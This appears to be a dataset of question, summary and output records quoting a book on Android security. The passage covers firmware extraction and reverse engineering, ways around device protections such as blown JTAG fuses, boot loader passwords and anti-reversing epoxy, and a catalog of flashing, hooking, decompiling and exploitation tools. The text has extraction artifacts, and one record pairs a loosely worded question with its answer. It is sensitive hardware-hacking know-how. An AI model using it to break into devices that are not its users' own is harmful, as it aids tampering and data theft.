the fi le as an\nExecutable and Linking Format (ELF) and what it suspects to be a tiny CramFS\nfi le system on the end.\nbinwalk is not a silver bullet. It often fails to identify the contents of binary\nfi les. This tends to happen more commonly on the image extracted from targets\nsuch as CPUs (specifi cally the CPUs embedded fl ash) and NAND. The following\nexcerpt demonstrates an attempt to use binwalk on an extracted fi rmware image.\n[s7ephen@xip ~]$\ns7s-macbook-pro:firmware_capture s7$ ls -alt Stm32_firmware.bin\n-rwxrwxrwx 1 s7 staff 1048576 Mar 14 2013 Stm32_firmware.bin\n[s7ephen@xip ~]$ binwalk Stm32_firmware.bin\n/var/folders/jb/dlpdf3ns1slblcddnxs7glsc0000gn/T/tmprDZue9, 734:\nWarning: New continuation level 2 is more than one larger than current\nlevel 0\nDECIMAL HEX DESCRIPTION\n----------------------------------------------------------------------\n[s7ephen@xip ~]$\nIn the preceding example, binwalk fails to identify anything within a one\nmegabyte binary image extracted from an STM32 microprocessor. In these cases,\nunfortunately, manual review of the binary image and custom development is\ngenerally the only recourse.\nc13.indd 08:24:56:AM 03/04/2014 Page 475\n476 Chapter 13 ■ Hardware Attacks\nImporting into IDA\nIf you know enough about the binary image to carve out any unnecessary bits,\nor if the executable binary image was obtained using other means, then import-\ning into IDA is the next step. Importing binary images into IDA often requires\nsome shoe-horning. Loading a binary from an embedded system into IDA is\nunfortunately not as straightforward as it is with ELFs, Mach-O, and Portable\nExecutable (PE) executable images. That said, IDA does offer a lot of functional-\nity to assist the reverse engineer with loading and parsing fi rmware images.\nWhen loading a fi rmware image into IDA, you generally have to follow a\nthree-step process. First, open the fi le with IDA and select Binary File or Dump\nas shown in Figure 13-44.\nFigure 13-44: IDA select Binary File\nNext, select the target’s architecture from the dialog shown in Figure 13-45.\nYou need to know enough about the architecture of your target processor to\nselect it (or one close to it).\nFinally, you need to know enough about your target to complete the form\nshown in Figure 13-46. This dialog essentially informs IDA about the entry point\nof the binary. You can gather some of this information from the specifi cations\nsheet of your target processor.\nc13.indd 08:24:56:AM 03/04/2014 Page 476\nChapter 13 ■ Hardware Attacks 477\nFigure 13-45: IDA select processor\nFigure 13-46: Specifying Load Addresses in IDA Pro\nAt this point, if you are fortunate, IDA loads the binary. When used to reverse\nengineer PEs, ELFs, or Mach-O binaries you may have only noticed Fast Library\nc13.indd 08:24:56:AM 03/04/2014 Page 477\n478 Chapter 13 ■ Hardware Attacks\nIdentifi cation and Recognition Technology (FLIRT) when it has failed to help\nyou (disassembling function entry or incorrectly identifying structures, for\nexample). But with fi rmware reverse engineering, FLIRT really shines. You\ncan access the FLIRT dialogs at any time by selecting the fl ower icon from the\ntoolbar as shown in Figure 13-47.\nOpen signatures window (Shift+F5)\nFigure 13-47: IDA FLIRT Signatures Toolbar icon\nMuch like binwalk, FLIRT combs through the fi le looking for signatures that\nyou can then apply to parts of your binary. Instead of identifying common binary\nfi le formats or fi le systems, FLIRT signatures aim to identify the compiler used\nto generate the code. If any FLIRT signatures match the fi rmware, the dialog\nshown in Figure 13-48 displays so you can select the correct signature set.\nFigure 13-48: IDA applying FLIRT signatures\nThis whole process is very much imperfect, but there are use cases for it on\nthe Internet (generally for video game ROMs and such). Anticipate spending\ntime fi ddling with IDA confi gurations quite a bit. Even when the binary appears\nto be properly loaded in IDA, you can also anticipate performing quite a few\nadditional fi x-ups in the middle of the disassembly. In the case of ARM code,\nadditional fi x-ups will likely be required because IDA will likely have diffi culty\nidentifying the function entry points or the instruction mode (ARM or THUMB).\nYou’ll simply have to perform these bits manually or make use of custom IDC\nor IDA Python scripts to help you out.\nc13.indd 08:24:56:AM 03/04/2014 Page 478\nChapter 13 ■ Hardware Attacks 479\nPitfalls\nHardware-based reverse engineering and vulnerability research can be extremely\nrewarding but not short of some complicating factors that can be quite frustrating\nto overcome. As such, here are some common pitfalls that you might encounter.\nCustom Interfaces\nPerhaps one of the most time-consuming and potentially annoying things to\nencounter on devices is custom hardware interfaces on seemingly standard\npins. Generally these custom interfaces pique your interest based on their\nlocation on the PCB, such as close to the main processor. Tracing the lines from\nthese interfaces to pins on the processor can often yield useful information. For\nexample, if several lines are traced to pins that you know from the data sheet\nare responsible for USART (Universal Synchronous and Asynchronous) or JTAG\nthen you can often deduce that these are debugging interfaces. These kinds of\ninterfaces are often also situated close to the target processor.\nHowever due to the unfamiliar interface, in these cases you will often need\nto fi nd the mating connector for the questionable interface and break out the\npins to more standard headers.\nA company called SchmartBoard makes hundreds of little boards that you\ncan use to build break-outs for strange connectors and other SMT (surface\nmounted) components.\nBinary/Proprietary Data\nStandard interfaces, such as UART, I2C, and SPI are commonly used for plain-text\ndata such as interactive consoles, boot messages, and debug output. However,\nin many cases — especially in the case of non-Linux and non-Android-based\nsystems such as those that run an RTOS — the bus uses a proprietary protocol.\nIn some cases this is manageable, such as if the proprietary protocol is entirely\nASCII based. With an entirely ASCII-based protocol you have immediate con-\nfi rmation that you have things properly confi gured. The fact that you can see\ntext is a good sign. You’re often also able to quickly identify patterns such as\nrecurring characters that act as delimiters for the protocol, or a certain unifor-\nmity in formatting (e.g., sequences of fl oating point numbers).\nHowever, you may encounter cases where the data on the bus is entirely\nbinary. In these cases it can be diffi cult to even be sure that you have correctly\ninterfaced with the device. Did you get the wrong baud rate and data encoding?\nIn these circumstances sometimes a combination of other techniques, such as\ndirectly accessing the fi rmware, can be used to help fi gure out what is going on.\nc13.indd 08:24:56:AM 03/04/2014 Page 479\n480 Chapter 13 ■ Hardware Attacks\nIf you are observing the mystery data on a bus between components, some-\ntimes spying on it (using previously described techniques) and writing some\nsimple protocol replication code to replay it will help; you might even fi nd bugs\nalong the way.\nBlown Debug Interfaces\nThere are many JTAG defenses, but perhaps the most common is referred to as\na JTAG fuse. These fuses can be physical (physically disconnect the JTAG lines\ninternal to the processor) or software based. Defeating either requires advanced\ntechniques that are outside the scope of this text. However, defeating them is pos-\nsible (specifi cally for software fuses). Ralph Phillip Weinmann briefl y discusses\nthese techniques to re-enable JTAG debugging in the baseband processor of his\nHTC Dream in his USENIX paper “Baseband Attacks: Remote Exploitation of\nMemory Corruptions in Cellular Protocol Stacks.” Kurt Rosenfeld and Ramesh\nKarri have written another in-depth paper on JTAG defenses entitled “JTAG:\nAttacks and Defenses,” although this paper focuses more on the general theory of\nattacks and a proposed defense. Additionally, you can fi nd resources on defeating\nthe blown software fuses for specifi c devices on some online developer forums.\nChip Passwords\nSome microcontroller manufacturers do not allow the device to be fl ashed unless\na user-defi nable password is used. These passwords are a string of bytes that\nare sent to the bootstrap loader in the chip. This prevents fl ashing, but some\nmicrocontroller vendors only enable some debug functionality if a “physical”\npassword is supplied to the chip.\nBoot Loader Passwords, Hotkeys, and Silent Terminals\nSome boot loaders, such as U-Boot, offer some security options to embedded\ndevelopers. U-Boot has some security features that enable a developer to hide\nthe U-Boot output or require a special hotkey, password, or special byte sequence\nover UART before entering an interactive U-Boot session. These cases tend to be\nrare as security conscious manufacturers would likely hide the UART interface\nas well, but they are not unheard of. Generally the fi rmware and hardware\ndesigners are working separately within a company or possibly even subcon-\ntracted out. In these cases, some more advanced techniques outside the scope\nof this text may be required to subvert these protections.\nIn some cases, boot messages from the boot loader, and even the operating sys-\ntem, may be observable, but then the line goes silent or begins spewing garbage.\nc13.indd 08:24:56:AM 03/04/2014 Page 480\nChapter 13 ■ Hardware Attacks 481\nSometimes, you are lucky, and the problem is merely a matter of the baud rate\nchanging. In other cases, there are custom debug interfaces that you should attach,\nor you might need a driver that uses binary data to transmit debug information\nto a custom piece of software monitoring the UART interface of a device.\nCustomized Boot Sequences\nThere are times you may rejoice at fi nding and successfully interfacing with\nUART (or some debugging output interface). You will watch it load the boot\nloader and boot into the kernel. You’ll watch drivers initialize and perhaps\neven rub your hands together in devilish anticipation for a login prompt—but\nit doesn’t come. Why?\nWhen this happens, generally the distribution of Linux or Android has been\ncustomized to not execute the login process. In many cases, embedded develop-\ners start their core processes directly after boot. Many of these kinds of applica-\ntions have a proprietary (often binary) protocol to communicate with a custom\nremote control or debugging/diagnostic client. A client such as this would run\non a PC connected to the device via UART.\nIn cases like this, you’ll miss the familiar login prompt but you can employ\nother techniques to subvert the device. Perhaps breaking into the boot loader\nwill give you access to the fi rmware image, or perhaps physically accessing the\nfl ash storage will provide a copy of the fi le system image to investigate further.\nThese are simply some things you may try, but this might require some further\ninvestigation if simple attempts like this are unsuccessful.\nUnexposed Address Lines\nPreviously in this chapter we mentioned that manufacturers will sometimes\nsandwich components like NAND fl ash on top of a microcontroller to save space\non a PCB in a confi guration known as PoP. Recall that such confi gurations can\nmake it diffi cult to identify the serial/part number for a microcontroller. There\nis another pitfall to these kinds of PoP confi gurations.\nIn the case where a fl ash chip is mounted on a microcontroller in a POP\nconfi guration, one drawback is that the pins of the fl ash chip are not exposed.\nIn fact, there are no pins. Therefore, in these cases, you cannot easily employ\nde-soldering techniques to remove the fl ash and read its contents. Therefore,\nthe only way (barring some advanced and tedious chip-separation techniques)\nto access the contents of fl ash is to access it through the microcontroller. If the\nmicrocontroller does not have debugging capabilities disabled then this is pos-\nsible. However, if, for example, the JTAG fuses have been blown, it might not be\npossible to easily access that data.\nc13.indd 08:24:56:AM 03/04/2014 Page 481"
  },
  {
    "input": "What are some common hardware attack techniques used to prevent reverse engineering of embedded devices?",
    "summary": "This chapter discusses hardware attacks on embedded devices, focusing on physical methods like using epoxy to prevent disassembly. It also covers techniques such as image encryption and obfuscation, which are less common in embedded systems due to their limitations. The chapter explains how to access and reverse engineer firmware through various interfaces, providing insights into device functionality and potential vulnerabilities.",
    "output": "482 Chapter 13 ■ Hardware Attacks\nAnti-Reversing Epoxy\nThere may be some targets that you dismantle only to fi nd that the PCB has\nbeen coated in a glossy or matte black or blue material. Sometimes this is done\nby manufacturers to protect the components from weather or condensation. But\nin most cases it is to prevent someone from easily connecting to components\nwith probes or to prevent de-soldering components to read data from them.\nSome of these are simple to defeat with a razor or the combination of a razor\nand the focused heat of a heat gun.\nOther, more expensive epoxies are mixed with a silicon-based compound.\nThis is to thwart people from using chemical compounds to dissolve the epoxy.\nThe reason for the silicon-based additives is that any chemical solvent that can\ndissolve the additive will likely also dissolve and destroy the silicon in the PCB\nand the component it is meant to protect, thus completely destroying the device.\nImage Encryption, Obfuscation, and Anti-Debugging\nWe have not encountered many embedded consumer devices that use these\ntechniques. Reverse engineers familiar with PC and mobile malware might\nimmediately think of the encryption and obfuscation techniques such as those\nused in malicious software for desktop computers (dead code preceded by jumps,\nruntime deobfuscation, and so on). Although there are probably a number of\nclever and custom ways to do this within the constraints of the components of\na device, they don’t seem to be too common in embedded devices because of\nthe constraints of space and computing power of a device.\nFor example, an encrypted bare-metal executable that decrypted itself on the\nfl y might seem like an immediate solution. However, on an embedded system\nwith limited RAM there may not be enough room for the full image to load.\nAdditionally, fl ash memory decays with each write, so most embedded devel-\nopers avoid writing to fl ash during execution. If an executable image is unable\nto perform unpacking in RAM, it would have to modify itself in fl ash. Doing\nthis on every boot of the device would not only be slow, but it would wear the\nstorage media more quickly.\nSummary\nThis chapter is designed to bring even the most uninitiated reader up to speed\non successfully leveraging physical access to attack embedded hardware such\nas Android devices. It covered several different types of interfaces that are\ncommonly exposed in embedded devices, including UART, JTAG, I2C, SPI, USB,\nand SD cards. It explained the how and why of identifying and communicating\nc13.indd 08:24:56:AM 03/04/2014 Page 482\nChapter 13 ■ Hardware Attacks 483\nwith these interfaces. Utilizing these interfaces, researchers are able to achieve\na deeper understanding of the target device.\nA popular goal of physical attacks against hardware is to discover, design,\nand implement further attacks that do not require physical access. Using a host\nof commercially and freely available tools, this chapter explained how accessing\nthese interfaces can provide access to the device’s fi rmware. Reverse engineering\nthe fi rmware provides deep insight into how the device works and may even\nreveal some critical vulnerabilities.\nFinally, we presented potential pitfalls that you might encounter when attempt-\ning to apply these tools and techniques in practice. Whenever possible, we rec-\nommended ways to conquer these challenges and achieve success despite them.\nc13.indd 08:24:56:AM 03/04/2014 Page 483"
  },
  {
    "input": "",
    "summary": "",
    "output": "APPENDIX\nA\nTool Catalog\nThis appendix includes a list of publicly available tools that have proven useful\nfor conducting security research on the Android operating system. This is by\nno means an exhaustive list. For example, this list does not include the tools\nwe developed and included with this book. Also, new tools are created and\nreleased every now and then.\nDevelopment Tools\nMost of the tools described in this section are aimed at application developers,\nalthough security researchers may also use them for building proof of concept\nprograms, debugging applications, or coding exploits specifi c to the Android\nplatform.\nAndroid SDK\nThe Android Software Development Kit (SDK) provides a set of core develop-\nment tools, application programming interface (API) libraries, documentation,\nand sample Android applications. The SDK, together with the Java Development\nKit and Apache Ant, is necessary for building, testing, and debugging Android\napplications.\n485\nbapp01.indd 01:51:38:PM 02/27/2014 Page 485\n486 Appendix A ■ Tool Catalog\nThe Android emulator, which is based on QEMU (short for “Quick EMUlator”),\nis also included in the SDK. Developers can test the applications developed using\nthe SDK in an emulated environment without the need for a real Android device.\nThe Android SDK is available for Linux, Mac OS X, and Windows platforms.\nYou can fi nd it at http://developer.android.com/sdk/index.html.\nAndroid NDK\nThe Android Native Development Kit (NDK) contains everything needed to\ndevelop native applications and libraries using C and C++. The NDK includes\na complete toolchain that can cross-compile native code for ARM, MIPS, and\nx86 platforms on Linux, OS X, or Windows. You can fi nd the Android NDK at\nhttp://developer.android.com/tools/sdk/ndk/index.html.\nEclipse\nEclipse is a multilanguage Integrated Development Environment (IDE) that\nincludes an extensible plug-in system, providing a wide variety of features such\nas version control systems, code debugging,UML, database explorers, etc. It has\nbeen the offi cially supported IDE for Android development since early versions\nof the Android SDK. You can fi nd Eclipse at www.eclipse.org/.\nADT Plug-In\nAndroid offers a custom Eclipse plug-in, the ADT plug-in, which extends Eclipse’s\ncapabilities to facilitate Android development. The ADT plug-in enables devel-\nopers to set up Android projects. Using the plug-in, developers can design\nAndroid user interfaces using a graphical editor, as well as build and debug\ntheir applications. You can fi nd the ADT plug-in at http://developer.android\n.com/sdk/installing/installing-adt.html.\nADT Bundle\nThe Android Developer Tools (ADT) bundle is a single download that con-\ntains everything needed for developers to start creating Android applications.\nIt includes the following:\n■ The Eclipse IDE with built-in ADT plug-in\n■ The Android SDK tools including the Android emulator and Dalvik Debug\nMonitor Server (DDMS)\nbapp01.indd 01:51:38:PM 02/27/2014 Page 486\nAppendix A ■ Tool Catalog 487\n■ The Android platform-tools including the Android Debug Bridge (ADB)\nand fastboot\n■ The latest android platform SDK and system image for the emulator\nYou can download the ADT bundle from http://developer.android.com/\nsdk/installing/bundle.html.\nAndroid Studio\nAndroid Studio is an IDE based on IntelliJ IDEA. It targets Android development\nspecifi cally. At the moment of this writing, it is still an early access preview.\nAs such, it still contains some bugs and unimplemented features. It is quickly\ngaining popularity among Android developers, of which many are switching\nfrom the traditionally used Eclipse IDE. Find out more about Android Studio\nat http://developer.android.com/sdk/installing/studio.html.\nFirmware Extraction and Flashing Tools\nWhen conducting security research it is common to fl ash devices with different\nfi rmware versions. On occasion, researchers might also need to return a device\nfrom a non-booting state. This requires fl ashing a stock fi rmware image to return\nthe device to normal operating mode. Sometimes vendors distribute fi rmware\npacked in proprietary formats, making them more diffi cult to analyze. If the\nformat is known, usually there is a tool available to extract the original contents\nof the fi rmware. This section presents the most commonly used tools to extract\nfi rmware and fl ash devices.\nBinwalk\nWhen conducting analysis on fi rmware images in unknown formats, Binwalk\nis indispensable. It is similar to the file utility, but instead scans for signatures\nthroughout large binaries. It supports several compression algorithms and is\nable to extract archives and fi le system images embedded within a fi rmware\nblob. You can read more about Binwalk at http://binwalk.org/.\nfastboot\nThe fastboot utility and protocol allows communicating with the boot loader of\nan Android device connected to a host computer via Universal Serial Bus (USB).\nUsing the fastboot protocol, the fastboot utility is often used to manipulate the\nbapp01.indd 01:51:38:PM 02/27/2014 Page 487\n488 Appendix A ■ Tool Catalog\ncontents of the device’s fl ash memory by fl ashing or erasing full partitions. You\ncan also use it for other tasks, such as booting a custom kernel without fl ashing it.\nAll Nexus devices support the fastboot protocol. Android device manufactur-\ners are allowed to choose if they want to support fastboot or implement their\nown fl ashing protocol in their device’s boot loaders.\nThe fastboot command-line utility is included with the Android platform\ntools in the Android SDK.\nSamsung\nThere are several tools for fl ashing Samsung devices. The format used in Samsung\nfi rmware updates is *.tar.md5, which consists basically in a tar archive fi le\nwith the md5 of the tar archive appended at the end. Each fi le contained inside\nthe tar.md5 archive corresponds to a raw partition on the device.\nODIN\nODIN is the Samsung proprietary tool and protocol used to fl ash and re-partition\nSamsung devices in download mode. In this mode, the boot loader expects to\nreceive data from the host computer via the USB port. Although Samsung has\nnever released the standalone Odin tool, it is widely used by enthusiasts on several\nInternet forums. It makes it possible to fl ash Samsung devices using the ODIN\nprotocol without installing the full Samsung desktop software. This software\nworks only on Windows and requires installing proprietary Samsung drivers.\nKies\nThe offi cially supported software for updating Samsung devices is the Kies\ndesktop software. It is able to check for updates on Samsung’s website and sync\nthe device’s data with the computer prior to fl ashing it. Kies is available for both\nWindows and Mac OS X. You can download Kies from www.samsung.com/kies/.\nHeimdall\nHeimdall is an open source command-line tool that makes it possible to fl ash\nSamsung fi rmware in ODIN mode, also known as download mode. It uses the\npopular USB access library libusb and works on Linux, OS X, and Windows.\nYou can fi nd Heimdall at www.glassechidna.com.au/products/heimdall/.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 488\nAppendix A ■ Tool Catalog 489\nNVIDIA\nMost Tegra devices have an NVIDIA proprietary recovery mode which enables\nyou to refl ash them, independently of which vendor has manufactured the device.\nnvfl ash\nNVIDIA Tegra devices are usually fl ashed using nvflash, a tool released by\nNVIDIA for Linux and Windows. It allows communicating with Tegra devices\nin a low-level diagnostic and device programming mode called APX mode.\nAccessing APX mode also requires installing proprietary NVIDIA drivers on\nWindows. You can download nvflash from\nhttp://http.download.nvidia.com/tegra-public-appnotes/\nflashing-tools.html#_nvflash\nLG\nLG devices include an Emergency Download Mode (EDM) used to fl ash the device\nfi rmware. You can usually access it with a device-dependent key combination.\nLGBinExtractor\nLGBinExtractor is an open source command-line tool for extracting the contents\nof LG’s BIN and TOT fi rmware fi les. It can split BIN fi les into the contained\npartitions, split TOT fi les into blocks and merge those blocks into the contained\npartitions, as well as display partition table information. You can fi nd out more\nabout LGBinExtractor at https://github.com/Xonar/LGBinExtractor.\nLG Mobile Support Tool\nThe Mobile Support tool from LG is the proprietary tool to fl ash LG devices.\nIt is available only for the Windows operating system and requires installing a\nproprietary LG driver as well. Visit www.lg.com/us/support/mobile-support\nto fi nd out more about the LG Mobile Support tool.\nHTC\nHTC devices have used various proprietary formats for fl ashing Android devices.\nFirst HTC used signed NBH fi les that contained raw partitions. Later, HTC\nstarted using standard zip fi les containing the partition images. Most recently,\nHTC has added encryption to those zip fi les.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 489\n490 Appendix A ■ Tool Catalog\nunruu\nHTC distributes its software updates packaged in a Windows executable, known\nas ROM Update Utility (RUU). This executable extracts a zip fi le to a temporary\nfolder and restarts the device in HBOOT mode to fl ash it.\nThe unruu utility is a simple Linux command-line tool that enables you to\nextract the ROM zip fi le from inside the RUU update executable. You can fi nd\nunruu at https://github.com/kmdm/unruu.\nruuveal\nIn 2012, HTC started encrypting the ROM zip fi les contained inside the RUU\nexecutable with a proprietary algorithm. However, the key to decrypt those zip\nfi les is contained in the device’s HBOOT.\nThe ruuveal utility enables you to decrypt those encrypted zip fi les, which\nrenders them usable with any standard zip utility. Visit https://github.com\n/kmdm/ruuveal.\nMotorola\nThis section presents the common tools to extract fi rmware fi les and fl ash\nMotorola devices.\nRSD Lite\nRSD Lite is a proprietary fl ashing tool for Motorola devices, which is widely\navailable on the Internet. RSD Lite enables you to fl ash Single Binary File (SBF)\nfi rmware fi les to Motorola devices. It is available only for Windows and requires\ninstalling proprietary Motorola drivers.\nsbf_fl ash\nThe sbf_flash utility is a simple command-line utility that duplicates the\nfunctionality of RSD Lite and enables you to fl ash SBF fi les to Motorola devices\non Linux and Mac OS X. Find out more about sbf_flash at http://blog\n.opticaldelusion.org/search/label/sbf_flash.\nSBF-ReCalc\nThe SBF-ReCalc tool enables you to split Motorola fl ash fi les into separate fi les\ncontained on them. It also enables you to create new SBF fi les and recalculates the\ncorrect checksum. It is available for Windows, Linux and OS X. Unfortunately,\nit doesn’t seem to be maintained anymore. You can fi nd it by searching the\nbapp01.indd 01:51:38:PM 02/27/2014 Page 490\nAppendix A ■ Tool Catalog 491\nInternet or visiting https://web.archive.org/web/20130119122224/http:\n//and-developers.com/sbf.\nNative Android Tools\nWhen working at the Android command-line interface, researchers often fi nd\nthemselves limited by the small set of commands provided by the Android\ntoolbox utility. This section covers the minimal set of utilities that will allow\na security researcher to inspect and debug Android applications more quickly\nand comfortably.\nBusyBox\nBusyBox is a single binary that provides simplifi ed versions of multiple UNIX\nutilities. It has been specially created for systems with limited resources. Using\na single binary makes it easy to transport and install. Also, it saves both disk\nspace and memory.\nEach application can be accessed by calling the busybox binary in one of two\nways. The most typical way is accomplished by creating a symbolic link using\nthe name of each utility supported by the busybox binary. Some versions of\nBusyBox implement the --install parameter to automate this process. You\ncan also call each utility by passing the application name as the fi rst parameter\nto the busybox binary.\nIf you don’t want to compile BusyBox yourself, several Android builds are freely\navailable through Google Play store. Visit www.busybox.net/ to fi nd out more.\nsetpropex\nsetpropex is a system properties editor very similar to the setprop utility\nthat comes with Android. In addition to the functionality offered by setprop,\nsetpropex also implements changing read-only system properties by attach-\ning to the init process using ptrace. You can download it from https://docs\n.google.com/open?id=0B8LDObFOpzZqY2E1MTIyNzUtYTkzNS00MTUwLWJmODAtZ\nTYzZGY2MDZmOTg1.\nSQLite\nA lot of Android applications use the SQLite database engine to manage their\nown private databases or to store data exposed through a content provider.\nHaving a sqlite3 binary on the device itself makes command-line client access\nto those databases very convenient. When auditing applications that use SQLite\nbapp01.indd 01:51:38:PM 02/27/2014 Page 491\n492 Appendix A ■ Tool Catalog\ndatabases, researchers can execute raw SQL statements to inspect or manipulate\nthe database. Visit www.sqlite.org/ to fi nd out more.\nstrace\nstrace is a useful diagnostic tool that enables you to monitor and trace the\nsystem calls executed by a process. It also shows which signals the program\nreceives and allows saving its output to disk. It is very useful for doing a quick\ndiagnostic and minimal debugging of native programs, especially when source\ncode is not available. You can download strace from http://sourceforge\n.net/projects/strace/.\nHooking and Instrumentation Tools\nSometimes you want to inspect or alter the behavior of an application for which\nsource code is not available. Sometimes you want to change or extend its func-\ntionality at runtime, trace its execution fl ow, and so on. The tools described in\nthis section provide a comfortable way for security researchers to hook and\ninstrument Android applications.\nADBI Framework\nThis Dynamic Binary Instrumentation (DBI) framework, created by Collin\nMulliner, enables you to change a process at runtime by injecting your own code\ninto the process. For example, it contains sample instruments used to sniff Near\nField Communications (NFC) between the NFC stack process and the NFC chip.\nYou can fi nd out more about ADBI Framework at www.mulliner.org/android/.\nldpreloadhook\nThe ldpdreloadhook tool facilitates function-level hooking of native programs\nthat are dynamically linked. This is accomplished using the LD_PRELOAD envi-\nronment variable. Among other things, it allows printing the contents of buffers\nbefore they are freed. This is especially useful when reverse-engineering native\nbinaries. Visit https://github.com/poliva/ldpreloadhook for more information.\nXPosed Framework\nXPosed framework enables you to modify the system or applications aspect\nand behavior at runtime, without modifying any Android application package\n(APK) or re-fl ashing.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 492\nAppendix A ■ Tool Catalog 493\nThis framework is hooked into Zygote by replacing the app_process binary.\nIt allows replacing any method in any class. It is possible to change parameters\nfor the method call, to modify the method’s return value, to skip the method\ncall, as well as replace or add resources. This makes it a powerful framework\nto develop system modifi cations in runtime that can affect either any applica-\ntion or the Android Framework itself. You can fi nd out more at http://forum\n.xda-developers.com/showthread.php?t=1574401.\nCydia Substrate\nCydia Substrate for Android enables developers to make changes to existing\nsoftware with Substrate extensions that are injected into the target process’s\nmemory.\nSubstrate is similar in functionality to XPosed Framework. However, it doesn’t\nreplace any system components to work. Further, it allows injecting your own\ncode into every single process. That means it can hook native code as well as\nDalvik methods. Substrate provides well-documented core application program-\nming interfaces (APIs) for making modifi cations to C and Java processes. Read\nmore about Cydia Substrate at www.cydiasubstrate.com/.\nStatic Analysis Tools\nThis section presents the tools that we fi nd useful when doing static analysis\nof Android applications. As Dalvik (the Android’s Java virtual machine [VM]\nimplementation) bytecode can be easily translated into Java bytecode, some tools\ndescribed here are not specifi cally written to use with Android.\nSmali and Baksmali\nSmali is an assembler for the Dalvik executable (DEX) format. Baksmali is the\nequivalent disassembler for Dalvik bytecode. Smali supports the full function-\nality of the DEX format including annotations, debug info, line info, and so on.\nSmali syntax is based on Jasmin and dedexer. Jasmin is the de facto standard\nassembly format for Java. dedexer is another DEX fi le disassembler that sup-\nports Dalvik op-codes. Check out https://code.google.com/p/smali/ for\nmore information.\nAndroguard\nAndroguard is an open source reverse-engineering and analysis framework\nwritten in Python. It can transform Android’s binary extensible markup language\nbapp01.indd 01:51:38:PM 02/27/2014 Page 493\n494 Appendix A ■ Tool Catalog\n(XML) into readable XML and includes a Dalvik decompiler (DAD) that can\ndecompile directly from Dalvik bytecode to Java source.\nAndroguard can disassemble, decompile, and modify DEX and Optimized\nDalvik executable (ODEX) fi les, and format them into full Python objects. It has\nbeen written with modularity in mind and allows for integration into other\nprojects. It provides access to perform static code analysis on objects like basic\nblocks, instructions, and permissions. Find out more about Androguard at\nhttps://code.google.com/p/androguard/.\napktool\napktool is an open source Java tool for reverse-engineering Android applica-\ntions. It can decode APK fi les into the original resources contained in them in\nhuman-readable XML form. It also produces disassembly output of all classes\nand methods contained using Smali.\nAfter an application has been decoded with apktool, you can work with the\noutput produced to modify resources or program behavior. For example, you\ncan translate the strings or change the theme of an application by modifying\nresources. In the Smali code, you can add new functionality or alter the behav-\nior of existing functionality. After you’re done with your changes, you can use\napktool to build an APK from the already decoded and modifi ed application.\nVisit https://code.google.com/p/android-apktool/.\ndex2jar\ndex2jar is an open source project written in Java. It provides a set of tools to\nwork with Android DEX and Java CLASS fi les.\nThe main purpose of dex2jar is to convert a DEX/ODEX into the Java Archive\n(JAR) format. This enables decompilation using any existing Java decompiler,\neven those not specifi c to Android bytecode.\nOther features of dex2jar include assembling and disassembling class fi les\nto and from Jasmin, decrypting strings in place inside a DEX fi le, and signing\nAPK fi les. It also supports automatically renaming the package, classes, methods,\nand fi elds inside DEX fi les, which is especially useful when the bytecode has\nbeen obfuscated with ProGuard. You can read more at https://code.google\n.com/p/dex2jar/.\njad\nJava Decompiler (jad) is a closed source and currently unmaintained decompiler\nfor the Java programming language. jad provides a command-line interface to\nproduce readable Java source code from CLASS fi les.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 494\nAppendix A ■ Tool Catalog 495\njad is often used with dex2jar to decompile closed source Android applica-\ntions. You can download jad from http://varaneckas.com/jad/.\nJD-GUI\nJD-GUI is a closed source Java decompiler that reconstructs Java source code\nfrom CLASS fi les. It provides a graphical interface to browse the decompiled\nsource code.\nCombined with dex2jar, you can use JD-GUI to decompile Android appli-\ncations. It is often used to supplement or complement jad. Sometimes one\ndecompiler produces better output than the other. Find out more at http://\njd.benow.ca/#jd-gui.\nJEB\nJEB is a closed source, commercial Dalvik bytecode decompiler that produces\nreadable Java source code from Android’s DEX fi les.\nSimilar to Androguard’s decompiler DAD, JEB does not need the use of\ndex2jar conversion to create the Java source. The main advantage of JEB\nis that it works as an interactive decompiler that enables you to examine\ncross-references, navigating between code and data, and deal with ProGuard\nobfuscation by interactively renaming methods, fi elds, classes, and packages.\nVisit www.android-decompiler.com/ to fi nd out more about JEB.\nRadare2\nRadare2 is an open source, portable reverse-engineering framework to manipu-\nlate binary fi les. It is composed of a highly scriptable hexadecimal editor with a\nwrapped input/output (I/O) layer supporting multiple back ends. It includes\na debugger, a stream analyzer, an assembler, a disassembler, code analysis mod-\nules, a binary diffi ng tool, a base converter, a shell-code development helper, a\nbinary information extractor, and a block-based hash utility. Although Radare2\nis a multipurpose tool, it is especially useful for disassembling Dalvik bytecode\nor analyzing proprietary binary blobs when dealing with Android reverse\nengineering.\nAs Radare2 supports multiple architectures and platforms, you can run it\neither on the Android device itself or on your computer. Visit www.radare\n.org/ to download it.\nbapp01.indd 01:51:38:PM 02/27/2014 Page 495\n496 Appendix A ■ Tool Catalog\nIDA Pro and Hex-Rays Decompiler\nThe Interactive Disassembler, commonly known as IDA, is a proprietary disas-\nsembler and debugger that is able to handle a variety of binaries and processor\ntypes. It offers features such as automated code analysis, an SDK for develop-\ning plug-ins, and scripting support. Since version 6.1, IDA includes a Dalvik\nprocessor module to disassemble Android bytecode in the Professional Edition.\nThe Hex-Rays Decompiler is an IDA Pro plug-in that converts the disassembled\noutput of x86 and ARM executables into a human readable C-like pseudo-code.\nYou can read more at https://www.hex-rays.com/.\nApplication Testing Tools\nThis section presents tools that do not exactly fi t well with the other sections\nof this appendix; those tools are used mostly to conduct security testing and\nvulnerability analysis of Android applications.\nDrozer (Mercury) Framework\nDrozer, formerly known as Mercury, is a framework for hunting for and exploiting\nvulnerabilities on Android. It automates checking for common things such as\nexported activities, exported services, exported broadcast receivers, and exported\ncontent providers. Further, it tests applications for common weaknesses such\nas SQL injection, shared user IDs, or leaving the debuggable fl ag enabled. Go\nto http://mwr.to/mercury to fi nd out more about Drozer.\niSEC Intent Sniff er and Intent Fuzzer\niSEC Intent Sniffer and Intent Fuzzer, two tools from iSEC Partners, run on the\nAndroid device itself and help the security researcher in the process of monitor-\ning and capturing broadcasted intents. They fi nd bugs by fuzzing components\nsuch as broadcast receivers, services, or single activities. You can read more about\nthe tools at https://www.isecpartners.com/tools/mobile-security.aspx.\nHardware Hacking Tools\nLeveraging physical access to attack embedded devices is made easier through\nthe use of several specialized tools. These tools include custom devices and soft-\nware that focus on fi lling a specifi c need. Whether you’re targeting an Android\ndevice or some other embedded device, these tools will help you along the way.\nbapp01.indd 